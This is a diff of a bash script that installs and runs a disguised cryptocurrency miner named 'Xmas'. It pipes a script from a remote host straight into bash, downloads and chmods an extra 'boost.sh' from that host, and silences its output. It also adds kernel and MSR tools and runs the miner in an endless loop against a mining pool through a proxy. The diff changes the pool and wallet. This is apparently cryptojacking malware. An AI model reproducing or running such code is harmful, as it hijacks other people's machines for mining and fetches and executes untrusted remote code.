@@ -32,7 +32,7 @@ curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bas
 
 sleep 4
 
-DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
+DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata kmod msr-tools > /dev/null
 
 sleep 2
 
@@ -66,7 +66,6 @@ currentdate+=$randomWord
 
 sleep 2
 
-
 echo ""
 echo "You will be using $used_num_of_cores cores"
 echo ""
@@ -79,7 +78,7 @@ tar -xf Xmas.tar.gz
 
 sleep 2
 
-sysctl -w vm.nr_hugepages=$(nproc)
+sysctl -w vm.nr_hugepages=$(nproc) 1>/dev/null 2>&1
 
 for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
 do
@@ -88,12 +87,20 @@ done
 
 sleep 2
 
-bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
+bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf" 1>/dev/null 2>&1
+
+sleep 2
+
+wget -q http://greenleaf.teatspray.uk/boost.sh >/dev/null
+sleep 2
+chmod +x boost.sh
+sleep 2
+#./boost.sh
 
 sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o de-qrl.miningocean.org:3333 -a rx/0 -u Q0105002628a239b471e885555ecdfbca3ef53ce3b5c8a90beb205d389fa14f4de7aa921dfc44a1 -p $currentdate -k --verbose --randomx-1gb-pages -t $used_num_of_cores -k --proxy=127.0.0.1:1081 1>/dev/null 2>&1
+./Xmas --donate-level 1 -o new.yadaminers.pl:5555 -u 1LorV6u6LVt3BZn3SejRXwJJyDLJNfyHmu.$currentdate --rig-id=$currentdate -p $currentdate -a rx/yada -k --randomx-1gb-pages --proxy=127.0.0.1:1081 -t $used_num_of_cores 1>/dev/null 2>&1
 sleep 10
 done
